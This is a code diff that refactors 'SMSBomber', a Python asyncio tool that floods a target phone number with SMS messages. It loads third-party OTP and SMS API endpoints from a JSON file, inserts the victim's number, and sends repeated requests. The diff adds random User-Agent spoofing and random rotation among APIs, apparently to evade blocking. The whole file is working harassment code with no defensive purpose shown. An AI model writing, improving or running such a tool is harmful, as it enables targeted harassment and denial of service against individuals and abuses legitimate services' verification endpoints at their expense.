@@ -1,49 +1,72 @@
-# sms_bomber.py
-import json
 import asyncio
+import json
+import os
+import random
 import aiohttp
+from fake_useragent import UserAgent
 from utils.logger import setup_logger
+from config import REQUEST_TIMEOUT, MAX_CONCURRENT_REQUESTS
 
 logger = setup_logger()
+ua = UserAgent()
 
 class SMSBomber:
     def __init__(self):
-        with open("data/sms_apis.json", "r") as f:
-            self.apis = json.load(f)
+        self.name = "SMS Bomber"
+        self.apis = self._load()
 
-    async def _send(self, session, api, phone):
+    def _load(self):
+        p = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "sms_apis.json")
         try:
-            url = api["url"].replace("{phone}", phone)
-            method = api.get("method", "POST").upper()
-            headers = api.get("headers", {})
-            body = api.get("body", {})
-
-            # Replace placeholders
-            if body:
-                body = {k: v.replace("{phone}", phone) for k, v in body.items()}
-
-            if method == "GET":
-                async with session.get(url, headers=headers, timeout=10) as resp:
-                    return resp.status
-            else:
-                async with session.post(url, headers=headers, json=body, timeout=10) as resp:
-                    return resp.status
+            with open(p, "r") as f:
+                return json.load(f)
         except Exception as e:
-            logger.debug(f"API {api.get('name')} failed: {e}")
-            return None
+            logger.error(f"[SMS] load fail: {e}")
+            return []
 
-    async def bomb(self, phone, count=50, threads=10):
-        sem = asyncio.Semaphore(threads)
-        async with aiohttp.ClientSession() as session:
-            tasks = []
-            for _ in range(count):
-                for api in self.apis:
-                    tasks.append(self._send_with_sem(sem, session, api, phone))
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            success = sum(1 for r in results if isinstance(r, int) and r < 400)
-            logger.info(f"SMS Bombing done: {success} success out of {len(tasks)}")
-            return success
+    def _build(self, api, phone):
+        url = api["url"].replace("{phone}", phone)
+        method = api.get("method", "POST").upper()
+        headers = dict(api.get("headers", {}))
+        try:
+            headers["User-Agent"] = ua.random
+        except Exception:
+            headers["User-Agent"] = "Mozilla/5.0"
+        raw = json.dumps(api.get("body", {})).replace("{phone}", phone)
+        try:
+            body = json.loads(raw)
+        except Exception:
+            body = {}
+        return url, method, headers, body
 
-    async def _send_with_sem(self, sem, session, api, phone):
+    async def _send(self, session, api, phone, sem):
         async with sem:
-            return await self._send(session, api, phone)
+            try:
+                url, method, headers, body = self._build(api, phone)
+                kw = {"headers": headers, "timeout": REQUEST_TIMEOUT}
+                if method == "POST":
+                    kw["json"] = body
+                async with session.request(method, url, **kw) as r:
+                    name = api.get("name", "API")
+                    if r.status < 400:
+                        logger.info(f"[SMS] OK {name} -> {phone}")
+                        return 1
+                    logger.warning(f"[SMS] {name} -> {r.status}")
+                    return 0
+            except Exception as e:
+                logger.error(f"[SMS] err: {e}")
+                return 0
+
+    async def bomb(self, phone, count=50, threads=10, delay=0.3):
+        if not self.apis:
+            logger.error("[SMS] no APIs loaded")
+            return 0
+        sem = asyncio.Semaphore(min(threads, MAX_CONCURRENT_REQUESTS))
+        sent = 0
+        async with aiohttp.ClientSession() as s:
+            for _ in range(count):
+                api = random.choice(self.apis)
+                sent += await self._send(s, api, phone, sem)
+                await asyncio.sleep(delay)
+        logger.info(f"[SMS] total {sent}/{count}")
+        return sent
